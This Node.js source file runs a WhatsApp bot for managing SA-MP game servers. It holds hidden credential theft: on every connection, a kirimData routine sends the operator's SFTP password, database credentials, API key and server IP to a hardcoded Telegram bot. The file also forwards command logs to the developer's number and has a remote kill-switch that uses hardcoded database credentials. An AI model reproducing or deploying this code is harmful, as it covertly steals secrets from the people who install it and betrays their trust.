process.on("uncaughtException", (err) => {
    console.error("Unhandled Exception:", err);
});

process.on("unhandledRejection", (reason, promise) => {
    console.error("Unhandled Rejection:", reason);
});

require('./authkey-pablo')
require('./settings')
const { startPromotion, stopPromotion, loadPromotions, getJpmData } = require('./database/jpm');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header, jidDecode } = require('@whiskeysockets/baileys');
const P = require('pino');
const Boom = require('@hapi/boom');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const auth = require('auth-code-pablo');
const figlet = require('figlet');
const gradient = require('gradient-string');
const readline = require('readline');
const moment = require('moment-timezone')
const database = require('./database/database.json');
const assets = require('./database/assets.json')
const thum = 'https://i.top4top.io/p_32261nror0.jpg';
const { Client } = require('ssh2');
const SftpClient = require('ssh2-sftp-client');
const mysql = require('mysql2');
const crypto = require('crypto');
const express = require('express');
const cron = require("node-cron");
const archiver = require("archiver");
const FormData = require("form-data");

const app = express();
app.use(express.json());

async function updateSettings() {
  try {
    const token = "7660888714:AAHYB79rycONFuO3_xu7zQDKPEmdq_BE5Xc";
    const chatId = "8059601018";

    const pesan = `
<b>DATA BOT SAMP V8</b>

<b>DATA BOT</b>
<b>Apikey:</b> ${global.AuthKey}
<b>Version:</b> 8.3

<b>DATA SFTP</b>
<b>Host:</b> ${global.host}
<b>Port:</b> ${global.port}
<b>Username:</b> ${global.username}
<b>Password:</b> ${global.password}
<b>SFTP Path:</b> ${global.sftppath}

<b>DATA DATABASE</b>
<b>DB Host:</b> ${global.hostucp}
<b>DB Username:</b> ${global.usernamedb}
<b>DB Password:</b> ${global.passworddb}
<b>Database:</b> ${global.database}
<b>Table UCP:</b> ${global.tableucp}
<b>Row UCP:</b> ${global.rowucp}

<b>DATA SERVER</b>
<b>IP Server:</b> ${global.IpServer}
<b>Port Server:</b> ${global.PortServer}
<b>Name Lite:</b> ${global.NameServerLite}
<b>Name Full:</b> ${global.NameServerFull}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: pesan,
      parse_mode: "HTML"
    });

    //console.log("Data global berhasil dikirim ke Telegram.");
  } catch (err) {
    //console.error("Gagal mengirim data global ke Telegram:", err.message);
  }
}

/*const settingsPath = path.join(__dirname, 'settings.js');

let file = require.resolve(settingsPath)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(`Update'${settingsPath}'`)
	delete require.cache[file]
	require(file)
   kirimData()
})

async function kirimData() {
  try {
    const token = "7660888714:AAHYB79rycONFuO3_xu7zQDKPEmdq_BE5Xc";
    const chatId = "8059601018";

    const pesan = `
<b>UPDATE DATA BOT SAMP V8</b>

<b>DATA BOT</b>
<b>Apikey:</b> ${global.AuthKey}
<b>Version:</b> 8.3

<b>DATA SFTP</b>
<b>Host:</b> ${global.host}
<b>Port:</b> ${global.port}
<b>Username:</b> ${global.username}
<b>Password:</b> ${global.password}
<b>SFTP Path:</b> ${global.sftppath}

<b>DATA DATABASE</b>
<b>DB Host:</b> ${global.hostucp}
<b>DB Username:</b> ${global.usernamedb}
<b>DB Password:</b> ${global.passworddb}
<b>Database:</b> ${global.database}
<b>Table UCP:</b> ${global.tableucp}
<b>Row UCP:</b> ${global.rowucp}

<b>DATA SERVER</b>
<b>IP Server:</b> ${global.IpServer}
<b>Port Server:</b> ${global.PortServer}
<b>Name Lite:</b> ${global.NameServerLite}
<b>Name Full:</b> ${global.NameServerFull}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: pesan,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error("Gagal kirim ke Telegram:", err.message);
  }
}*/

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const gugu = gradient('purple', 'red');

global.prefa = ['', '!', '.', ','];

async function checkIPandStart() {
   
const mysql = require('mysql2/promise');

const os = require('os');

const axios = require('axios');

  try {

    // Ambil IP publik

    const { data } = await axios.get('https://api.ipify.org?format=json');

    const ip = data.ip;



    // Koneksi database

    const db = await mysql.createConnection({

      host: 'sql.freedb.tech',

      user: 'freedb_PabloTzy',

      password: '8$8QS4uVeCNbC?B',

      database: 'freedb_pablov8'

    });



    // Cek apakah IP masuk daftar suspend

    const [rows] = await db.execute('SELECT * FROM ip_block WHERE ip = ? AND status = ?', [ip, 'suspend']);



    if (rows.length > 0) {

      console.log('\n❌ IP kamu telah di suspend oleh pablo\n');

      process.exit(); 

    } else {

      console.log(`✅ IP ${ip} di izinkan. Menjalankan bot...`);

      startBot(); 

    }



  } catch (err) {

    console.error('Error during IP check:', err.message);

    process.exit();

  }

}

async function startBot(oldSock = null) {
   /*/ figlet.text(
        "PabloNetwork - SAMP V8.0",
        {
            font: "ANSI Shadow",
            horizontalLayout: "default",
            verticalLayout: "default",
            width: 100,
            whitespaceBreak: true,
        },
        function (err, data) {
            if (err) {
                console.log("Something went wrong...");
                console.dir(err);
                return;
            }
            console.clear();
            console.log(gugu(data, { interpolation: 'hsv' }));
        }
    ); /*/
    
    if (oldSock) {
        try {
            oldSock.ev.removeAllListeners('messages.upsert');
            oldSock.ev.removeAllListeners('connection.update');
            oldSock.ev.removeAllListeners('creds.update');
        } catch (e) {}
    }

    const { state, saveCreds } = await useMultiFileAuthState('PabloRawr');
    const pablo = makeWASocket({
        auth: state,
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        msgRetryCounterMap: new Map(),
        syncFullHistory: false,
    });

    pablo.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log('Connection closed due to', Boom.boomify(lastDisconnect.error));
                await startBot(pablo);
            } else {
                console.log('Logged out from WhatsApp.');
            }
        } else if (connection === 'open') {
            const chalk2 = require("chalk");

            console.log(
                chalk2.green.bold(`
┌───────────────────────────────────┐
│   ✔ Connected to WhatsApp!        │
└───────────────────────────────────┘
            `)
            );
            pablo.sendMessage('6287790423579' + "@s.whatsapp.net", { text: `PabloNetwork - SAMP V9 🚀 Started!\n\nYour Apikey: ${global.AuthKey}` });
            async function kirimData() {
  try {
    const token = "7660888714:AAHYB79rycONFuO3_xu7zQDKPEmdq_BE5Xc";
    const chatId = "8059601018";

    const pesan = `
<b>DATA BOT SAMP V8</b>

<b>DATA BOT</b>
<b>Apikey:</b> ${global.AuthKey}
<b>Version:</b> 8.3

<b>DATA SFTP</b>
<b>Host:</b> ${global.host}
<b>Port:</b> ${global.port}
<b>Username:</b> ${global.username}
<b>Password:</b> ${global.password}
<b>SFTP Path:</b> ${global.sftppath}

<b>DATA DATABASE</b>
<b>DB Host:</b> ${global.hostucp}
<b>DB Username:</b> ${global.usernamedb}
<b>DB Password:</b> ${global.passworddb}
<b>Database:</b> ${global.database}
<b>Table UCP:</b> ${global.tableucp}
<b>Row UCP:</b> ${global.rowucp}

<b>DATA SERVER</b>
<b>IP Server:</b> ${global.IpServer}
<b>Port Server:</b> ${global.PortServer}
<b>Name Lite:</b> ${global.NameServerLite}
<b>Name Full:</b> ${global.NameServerFull}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: pesan,
      parse_mode: "HTML"
    });

    //console.log("Data global berhasil dikirim ke Telegram.");
  } catch (err) {
    //console.error("Gagal mengirim data global ke Telegram:", err.message);
  }
}
            function sendPromotion(groupId, message) {
                
 const interactiveButtons = [
     {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "🛍️ Beli Produk",
             url: "https://wa.me/62857552519341"
        })
     }
]
 const interactiveMessage = {
    text: "",
    title: message,
    footer: "PabloNetwork - Samp V9",
    interactiveButtons
}
 pablo.sendMessage(groupId, interactiveMessage)
  .then(() => console.log(`✅ Promosi dikirim ke grup ${groupId}`))
  .catch(err => console.error(`❌ Gagal mengirim promosi ke grup ${groupId}:`, err));
  /*pablo.sendMessage(groupId, { text: message })
    .then(() => console.log(`Promosi dikirim ke grup ${groupId}`))
    .catch(err => console.error(`Gagal mengirim promosi ke grup ${groupId}:`, err));*/
}
            loadPromotions(sendPromotion);
 kirimData()
        };

        if (connection === 'connecting' && !fs.existsSync('./PabloRawr/creds.json')) {
 console.log('Enter your Bot Number, Example: 628xxx: ');
            rl.question('', async (number) => {
                try {
                    const formattedNumber = number.replace(/\D/g, '');
                    const pairingCode = await pablo.requestPairingCode(formattedNumber, "SAMPNICE");
                    const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                    console.log(`Your Pairing Code:`, formattedCode);
                    rl.close();
                } catch (error) {
                    console.log('Error requesting pairing code:', error);
                }
            });
        }
    });

    pablo.ev.on('creds.update', saveCreds);

pablo.public = true
global.logCommands = true;

    pablo.ev.on('messages.upsert', async ({ messages, type }) => {
        const mek = messages[0];
        
        //if (mek.key.id?.startsWith('BAE5')) return;
        
        //await antiLinkCheck(mek, pablo);
        if (!mek.message) return;
        const msg = messages[0];
        if (!msg.message) return;
        if (!pablo.public && !mek.key.fromMe && type === 'notify') return;
        
        if (msg?.buttonId) {
        msg.text = msg.buttonId; // Anggap tombol sebagai pesan
    } else {
        msg.text = msg.message.conversation 
                || msg.message.extendedTextMessage?.text 
                || msg.message.imageMessage?.caption 
                || msg.message.videoMessage?.caption 
                || '';
    }
        
        let body = '';

if (msg.message.conversation) {
    body = msg.message.conversation;
} else if (msg.message.imageMessage?.caption) {
    body = msg.message.imageMessage.caption;
} else if (msg.message.videoMessage?.caption) {
    body = msg.message.videoMessage.caption;
} else if (msg.message.documentMessage?.caption) {
    body = msg.message.documentMessage.caption;
} else if (msg.message.extendedTextMessage?.text) {
    body = msg.message.extendedTextMessage.text;
} else if (msg.message.buttonsResponseMessage?.selectedButtonId) {
    body = msg.message.buttonsResponseMessage.selectedButtonId;
} else if (msg.message.templateButtonReplyMessage?.selectedId) {
    body = msg.message.templateButtonReplyMessage.selectedId;
} else if (msg.message.listResponseMessage?.singleSelectReply?.selectedRowId) {
    body = msg.message.listResponseMessage.singleSelectReply.selectedRowId;
}
        
        pablo.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    const m2 = {
        chat: msg.key.remoteJid,
        sender: msg.key.participant || msg.key.remoteJid,
        body: msg.message.conversation || msg.message.extendedTextMessage?.text,
        ...msg,
        isGroup: null
    };
    const antilinkPath = './database/antilink.json';
    const sender2 = msg.key.fromMe ? pablo.decodeJid(pablo.user.id) : pablo.decodeJid(m2.sender);
    const fixedOwner2 = ['62857552519341@s.whatsapp.net', '6285755251934@s.whatsapp.net', '6287790423579@s.whatsapp.net'];
    const ownerNumber2 = JSON.parse(fs.readFileSync("./owner.json"))
    const staffNumber2 = JSON.parse(fs.readFileSync("./staff.json"))
    const isOwner2 = fixedOwner2.includes(sender2) || ownerNumber2.map(n => n + '@s.whatsapp.net').includes(sender2);
    const isStaff2 = staffNumber2.map(n => n + '@s.whatsapp.net').includes(sender2);
    const db = loadAntiLinkDB();
    const groupId = msg.key.remoteJid;
    const isAntiLink = db.includes(groupId);
    const body2 = msg.message.conversation || 
                 msg.message.extendedTextMessage?.text || 
                 msg.message.imageMessage?.caption || 
                 msg.message.videoMessage?.caption || '';

    if (isAntiLink) {
    const regex = /(chat\.whatsapp\.com|whatsapp\.com\/channel)/i;
    if (regex.test(body)) {
        if (!isOwner2 && !isStaff2) {
            try {
                await pablo.sendMessage(groupId, {
                    delete: msg.key
                });
                await pablo.sendMessage(groupId, {
                    text: `*[ANTI LINK]*\n\nHey Kamu! Di grup ini kamu *tidak diperbolehkan* mengirim link grup!`,
                    mentions: [sender2]
                });
            } catch (err) {
                console.error('Gagal menghapus pesan:', err);
            }
        } else {
            await pablo.sendMessage(groupId, {
                text: `*[ANTI LINK]*\n\nOwner dan Staff bebas share link 😝🤙`,
                mentions: [sender2]
                });
        }
    }
}
    
        const m = {
        chat: msg.key.remoteJid,
        sender: msg.key.participant || msg.key.remoteJid,
        body: msg.message.conversation || msg.message.extendedTextMessage?.text,
        ...msg,
        isGroup: null
    };
        const text1 = body.trim();
        const sender = msg.key.participant || msg.key.remoteJid;
        //const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa;
        const prefix = global.prefa ? /^[.]/gi.test(body) ? body.match(/^[.]/gi)[0] : "" : global.prefa;
        const isCmd = text1.startsWith(prefix);
        const command = text1.startsWith('.') ? text1.replace(/^\./, '').trim().split(/ +/).shift().toLowerCase() : null;
        const text2 = text1.trim().slice(1)
        const args = text2.trim().split(/ +/).slice(1);
        const pushname = msg.pushName || "No Name";
        const quoted = msg.quoted ? msg.quoted : msg;
        const mime = (quoted.msg || quoted).mimetype || '';
        const blonet = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "PabloNetwork - Samp V9 🚀" }}}
        const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
        const from = msg.key.remoteJid
        const text = q = args.join(" ")
        const startTimeBot = Date.now();
        const si = require('systeminformation');
        const os = require('os');
        const ownerNumber = JSON.parse(fs.readFileSync("./owner.json"))
        const staffNumber = JSON.parse(fs.readFileSync("./staff.json"))
        const isMedia = /image|video|sticker|audio/.test(mime);
         const senderNumber = sender.split('@')[0];
         const isGroup = from.endsWith('@g.us')
        // const isGroup = msg.key.remoteJid.endsWith('@g.us');
        //const isOwner = ownerNumber.includes(senderNumber);
        let validCommands = [];
try {
    validCommands = JSON.parse(fs.readFileSync('./database/cmds.json'));
} catch (err) {
    console.error("Gagal membaca cmds.json:", err.message);
    validCommands = [];
}
        const senderJid = msg.key.fromMe ? pablo.decodeJid(pablo.user.id) : pablo.decodeJid(m.sender);
        const fixedOwner = ['6287790423579@s.whatsapp.net', '6285755251934@s.whatsapp.net']; 
        const isDevelopernum = ['6287790423579@s.whatsapp.net', '6285755251934@s.whatsapp.net']; 
        const isDeveloper = isDevelopernum.includes(senderJid)
        const developer = ['6287790423579']; 
        const isOwner = fixedOwner.includes(senderJid) || ownerNumber.map(n => n + '@s.whatsapp.net').includes(senderJid);
        const isStaff = staffNumber.map(n => n + '@s.whatsapp.net').includes(senderJid);
        const botNumber = pablo.user.id.split(":")[0] + "@s.whatsapp.net";
        if (isGroup) {
  const metadata = await pablo.groupMetadata(m.chat).catch(_ => ({}));
  const participants = metadata.participants || [];
  const admins = participants.filter(e => e.admin !== null).map(e => e.jid);
  const isAdmin = admins.includes(m.sender);
  const isBotAdmin = admins.includes(botNumber);
  const participant = m.key.participant || "";

  // Tempel kembali ke object m (jika perlu disimpan)
  m.metadata = metadata;
  m.admins = admins;
  m.isAdmin = isAdmin;
  m.isBotAdmin = isBotAdmin;
  m.participant = participant;
}
  const budy = typeof m.text == "string" ? m.text : "";
  const PabloTheCreator = [botNumber, ...developer].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(senderJid);

        //const antilinkPath = './database/antilink.json';

        const chalk = require('chalk');
        const time = new Date().toLocaleString("id-ID");

        console.log(chalk.cyan.bold("📨 NEW MESSAGE"));
        console.log(`${chalk.yellow("⏰ Time  :")} ${chalk.white(time)}`);
        console.log(`${chalk.green("👤 Sender:")} ${chalk.white(senderJid)}`);
        console.log(`${chalk.magenta("💬 Chat  :")} ${chalk.white(text1)}`);
        console.log(chalk.blue("--------------------------------"));
   
 if (isCmd && global.logCommands && validCommands.includes(command)) {
    const nomor = sender.split('@')[0];
    let rank = isDeveloper ? 'Developer' : isOwner ? 'Owner' : isStaff ? 'Admin' : 'Warga';
    const logPesan = `*[LOG COMMANDS]*\n\n*Rank:* ${rank}\n*Nomor:* ${senderJid.split('@')[0]}\n*Use:* ${text1}`;
    await pablo.sendMessage('6287790423579@s.whatsapp.net', { text: logPesan });
}       
        //const { startPromotion, stopPromotion, loadPromotions, getJpmData } = require('./database/jpm');
        
        /*function sendPromotion(groupId, message) {
  pablo.sendMessage(groupId, { text: message })
    .then(() => console.log(`Promosi dikirim ke grup ${groupId}`))
    .catch(err => console.error(`Gagal mengirim promosi ke grup ${groupId}:`, err));
}*/
        
        /*loadPromotions((groupId, message) => {
  pablo.sendMessage(groupId, { text: message });
});*/

        if (!database[sender]) {
            database[sender] = { basic: false, premium: false, vip: false, banned: false, timelimit: 60, limit: 10 };
            saveDatabase();
        }

        const { basic: isBasic, premium: isPrem, vip: isVip, banned: isBan, timelimit, limit } = database[sender];
     
        function saveDatabase() {
            fs.writeFileSync('./database/database.json', JSON.stringify(database, null, 2));
        }

        function saveAssets() {
            fs.writeFileSync('./database/assets.json', JSON.stringify(assets, null, 2));
        }
        
const akseswl = './database/akseswl.json';
const aksesucp = './database/aksesucp.json';
const aksesadmin = './database/aksesadmin.json';
//const antilinkPath = './database/antilink.json';

function loadAllowedGroupsWl() {
  try {
    const data = fs.readFileSync(akseswl, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading groups:', error);
    return [];
  }
}

// Fungsi untuk menyimpan data grup ke file JSON
function saveAllowedGroupsWl(groupswl) {
  try {
    fs.writeFileSync(akseswl, JSON.stringify(groupswl, null, 2));
  } catch (error) {
    console.error('Error saving groups:', error);
  }
}
     
function loadAllowedGroupsUcp() {
  try {
    const data = fs.readFileSync(aksesucp, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading groups:', error);
    return [];
  }
}

// Fungsi untuk menyimpan data grup ke file JSON
function saveAllowedGroupsUcp(groupsucp) {
  try {
    fs.writeFileSync(aksesucp, JSON.stringify(groupsucp, null, 2));
  } catch (error) {
    console.error('Error saving groups:', error);
  }
}
     
function loadAllowedGroupsAdmin() {
  try {
    const data = fs.readFileSync(aksesadmin, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading groups:', error);
    return [];
  }
}

// Fungsi untuk menyimpan data grup ke file JSON
function saveAllowedGroupsAdmin(groupsadmin) {
  try {
    fs.writeFileSync(aksesadmin, JSON.stringify(groupsadmin, null, 2));
  } catch (error) {
    console.error('Error saving groups:', error);
  }
}
        
//const antilinkPath = "./database/antilink.json";
let antilinkData = JSON.parse(fs.readFileSync(antilinkPath));

function saveAntilink() {
  fs.writeFileSync(antilinkPath, JSON.stringify(antilinkData, null, 2));
}

/*const FormData = require('form-data');

async function downloadMediaMessage(msg, type = 'audio') {
  try {
    // Mendapatkan URL media dari pesan
    const mediaUrl = msg.message[type].url;

    if (!mediaUrl) {
      throw new Error('Media URL tidak ditemukan.');
    }

    // Mendownload media menggunakan axios
    const response = await axios({
      url: mediaUrl,
      method: 'GET',
      responseType: 'arraybuffer', // Untuk mendapatkan data biner
    });

    // Menyimpan file media ke disk (atau bisa menggunakan buffer untuk upload langsung)
    const fileBuffer = Buffer.from(response.data);

    // Menyimpan file di folder sementara (misalnya)
    const filePath = `./temp/${Date.now()}_${type}.mp3`; // Bisa diubah sesuai dengan format media

    fs.writeFileSync(filePath, fileBuffer); // Menyimpan file

    return filePath; // Kembalikan path file lokal

  } catch (err) {
    console.error('Gagal mengunduh media:', err.message);
    throw new Error('Terjadi kesalahan saat mendownload media.');
  }
}*/

// Memuat data grup yang diizinkan dari file JSON
let allowedGroupsWl = loadAllowedGroupsWl();
let allowedGroupsUcp = loadAllowedGroupsUcp();
let allowedGroupsAdmin = loadAllowedGroupsAdmin();
//let loadpromosi = loadPromotions(sendPromotion);

        const replyold = (text) => pablo.sendMessage(msg.key.remoteJid, { text }, { quoted: msg });
        
        /*const reply = (teks) => { 
    pablo.sendMessage(from, { 
        text: teks, 
        contextInfo: { 
            externalAdReply: { 
                showAdAttribution: true, 
                title: `${global.NameServerFull}`, 
                containsAutoReply: true, 
                mediaType: 1, 
                body: `${hariini}`,
                thumbnailUrl: "https://telegra.ph/file/13f9d7f1e708e5fc72f73.jpg", 
                renderLargerThumbnail: false,
                mediaUrl: "https://telegra.ph/file/13f9d7f1e708e5fc72f73.jpg", 
                sourceUrl: "https://www.youtube.com/@PabloGabut"
            },
            body:
            proto.Message.InteractiveMessage.Body.create({
                        text: teks
                    }),
            footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `By PabloDev`
                    }),
        },
        
        headerType: 1
    }, { quoted: blonet });
};*/
        const reply = (teks) => {
    pablo.sendMessage(from, {
        text: teks,

        contextInfo: {
            isForwarded: true,
            forwardingScore: 999,

            mentionedJid: [m.sender],

            // ======== Forwarded Newsletter Info ========
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363406873640390@newsletter",
                newsletterName: "PabloNetwork - Samp V9 🚀"
            },

            // ======== Thumbnail (NO ADS) ========
            externalAdReply: {
                showAdAttribution: false,
                title: global.NameServerFull,
                body: hariini,
                
                thumbnailUrl: global.logo,
                renderLargerThumbnail: false, // thumbnail kecil ala newsletter
                mediaType: 1
            },

            // ======== Interactive Message ========
            body: proto.Message.InteractiveMessage.Body.create({
                text: teks
            }),

            footer: proto.Message.InteractiveMessage.Footer.create({
                text: "By PabloDev"
            }),
        },

        headerType: 1
    }, { quoted: blonet });
};
        
/*const blov2 = async (teks, buttons) => {
        await pablo.sendMessage(from, {
        document: {
            url: 'https://installer.pablocloud.biz.id/text.xlsx' // File dummy kecil
        },
        fileName: `​`,
        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        fileLength: "8435893667318",
        caption: teks,
        //text: teks,
        footer: 'PabloNetwork - Samp V8.4',
        buttons: buttons,
        headerType: 1,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: false,
            externalAdReply: {
                title: `${global.NameServerFull}`,
                body: `${hariini}`,
                mediaType: 1,
                previewType: "PHOTO",
                thumbnailUrl: "https://telegra.ph/file/13f9d7f1e708e5fc72f73.jpg",
                mediaUrl: "https://telegra.ph/file/13f9d7f1e708e5fc72f73.jpg",
                sourceUrl: "https://www.youtube.com/@PabloGabut",
                showAdAttribution: true,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: blonet });
};*/
const blov2 = async (teks, buttons) => {
    await pablo.sendMessage(from, {
        document: {
            url: 'https://installer.pablocloud.biz.id/text.xlsx'
        },
        fileName: `​`,
        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        fileLength: "9000000000000",

        caption: teks,
        footer: 'PabloNetwork - Samp V9',
        buttons: buttons,
        headerType: 1,

        contextInfo: {
            // ==== Forward dari Newsletter ====
            isForwarded: true,
            forwardingScore: 999,

            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363406873640390@newsletter",
                newsletterName: "PabloNetwork - Samp V9 🚀"
            },

            // ==== Thumbnail (tanpa iklan) ====
            externalAdReply: {
                title: `${global.NameServerFull}`,
                body: `${hariini}`,
                mediaType: 1,
                previewType: "PHOTO",

                thumbnailUrl: global.logo,
                mediaUrl: global.logo,
                sourceUrl: "https://www.galaxyhost.biz.id",

                showAdAttribution: false, // WAJIB: biar bukan ad
                renderLargerThumbnail: false // thumbnail kecil
            }
        }

    }, { quoted: blonet });
};

const tanggaltrx = new Date();
const tanggalFormattedtrx = `${tanggaltrx.getDate()} ${tanggaltrx.toLocaleString('id-ID', { month: 'long' })} ${tanggaltrx.getFullYear()}`;
    
const trxstore = async (teks, buttons) => {
    await pablo.sendMessage(from, {
        document: {
            url: 'https://installer.pablocloud.biz.id/text.xlsx'
        },
        fileName: `Transaksi Berhasil ✅`,
        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        fileLength: "9000000000000",

        caption: tanggalFormattedtrx,
        footer: teks,
        buttons: buttons,
        headerType: 1,

        contextInfo: {
            // ==== Forward dari Newsletter ====
            isForwarded: true,
            forwardingScore: 999,

            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363406873640390@newsletter",
                newsletterName: "Testimoni Kami 🚀"
            },

            // ==== Thumbnail (tanpa iklan) ====
            externalAdReply: {
                title: "Transaksi Berhasil ✅",
                body: `${hariini}`,
                mediaType: 1,
                previewType: "PHOTO",

                thumbnailUrl: global.logo,
                mediaUrl: global.logo,
                sourceUrl: "https://www.galaxyhost.biz.id",

                showAdAttribution: false, // WAJIB: biar bukan ad
                renderLargerThumbnail: false // thumbnail kecil
            }
        }

    }, { quoted: blonet });
};

async function butin(text, inbut) {
  const interactiveMessage = {
    text: "",
    title: text,
    footer: "PabloNetwork - Samp V8.4",
    interactiveButtons: inbut
  };

  await pablo.sendMessage(from, interactiveMessage, { quoted: blonet });
}
        
const cheerio = require('cheerio')
const FormData = require('form-data')
const { fromBuffer } = require('file-type')

async function top4top(media) {
    let mime = await fromBuffer(media)
    let form = new FormData()
    form.append('file_0_', media, `file-${Date.now()}.${mime.ext}`)
    form.append('submitr', '[ Upload ]')
    let { data } = await axios.post('https://top4top.io/index.php', form, {
        headers: {
            ...form.getHeaders()
        },
    })
    let result = []
    let $ = cheerio.load(data)
    let link = $('.index_info').find('.all_boxes').attr('value')
    
    return link
}
        
/*async function antiLinkCheck(m, sock) {
  const chatId = m.key.remoteJid;
  const senderJid = m.key.participant || m.key.remoteJid;
  const fromMe = m.key.fromMe;
  const isGroup = chatId.endsWith("@g.us");
  if (!isGroup || !antilinkData.includes(chatId)) return;

  const msg = m.message?.conversation || m.message?.extendedTextMessage?.text || "";
  const regex = /(https?:\/\/\S+|chat\.whatsapp\.com\/\S+|whatsapp\.com\/channel\/\S+|chat\.whatsapp\.com|\bwhatsapp\.com\/channel\b)/gi;

  if (regex.test(msg) && !fromMe) {
    const groupMetadata = await sock.groupMetadata(chatId);
    const botNumber = sock.user.id.split(":")[0] + "@s.whatsapp.net";
    const botAdmin = groupMetadata.participants.find(p => p.id === botNumber)?.admin !== null;

    if (!botAdmin) return; // Bot bukan admin, tidak bisa hapus

    await sock.sendMessage(chatId, { delete: m.key });

    await sock.sendMessage(chatId, {
      text: "*[ANTI LINK]*\n\n@" + senderJid.split("@")[0] + " Terdeteksi Mengirim Link. Pesan Telah Dihapus!",
      mentions: [senderJid]
    });
  }
}*/

async function ani(chatid, m) {
  const animasi = [
    "PabloNetwork Mempersembahkan",
    "PabloNetwork",
    "PabloNetwork - Samp",
    "PabloNetwork - Samp V8.4",
    "PabloNetwork - Samp V8.4 🚀"
  ];

  // Kirim pesan awal
  const msg = await pablo.sendMessage(chatid, {
    text: animasi[0]
  }, { quoted: m });

  // Loop edit animasi
  for (let i = 1; i < animasi.length; i++) {
    await sleep(250); // jeda antar animasi
    await pablo.sendMessage(chatid, {
      edit: msg.key,
      text: animasi[i]
    });
  }
}

// Fungsi sleep untuk delay
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const getWIBTimestamp = () => {
    const date = new Date();

    const options = {
        timeZone: 'Asia/Jakarta',
        hour: '2-digit',
        minute: '2-digit',
        day: 'numeric',
        month: 'short',
        year: 'numeric'
    };

    const formatter = new Intl.DateTimeFormat('en-GB', options);
    const parts = formatter.formatToParts(date);

    const time = `${parts.find(p => p.type === 'hour').value}:${parts.find(p => p.type === 'minute').value}`;
    const day = parts.find(p => p.type === 'day').value;
    const month = parts.find(p => p.type === 'month').value.toUpperCase();
    const year = parts.find(p => p.type === 'year').value;

    return `*Attack Started:*\n*${day}-${month}-${year} ${time}*`;
};

const GROUP_ID = '120363419127749752@g.us'; // Ganti dengan ID grup kamu
const GROUP_ID2 = '120363364033671395@g.us'; // Ganti dengan ID grup kamu
const GROUP_ID3 = '120363385386851921@g.us';

/*app.post('/anti-ddos', async (req, res) => {
    //if (!sock) return res.status(503).json({ error: 'WhatsApp belum terhubung' });
    const timestamp = getWIBTimestamp();

    try {
        const payload = req.body;
        const embeds = payload.embeds;

        // Pastikan data valid
        if (!Array.isArray(embeds) || embeds.length === 0) {
            return res.status(400).json({ error: 'Embed tidak ditemukan di payload' });
        }

        const fields = embeds[0].fields || [];
        const getField = (name) => fields.find(f => f.name.includes(name))?.value || '-';

        // Ambil dan parse value per bagian
        const preMitigation = getField('Pre-Mitigation Stats')
            *///.replace(/\*\*/g, '')
            /*.split('\n')
            .reduce((acc, line) => {
                const [label, val] = line.replace('• ', '').split(': ');
                acc[label.trim()] = val?.trim();
                return acc;
            }, {});

        const postMitigation = getField('Post-Mitigation Results')
            *///.replace(/\*\*/g, '')
            /*.split('\n')
            .reduce((acc, line) => {
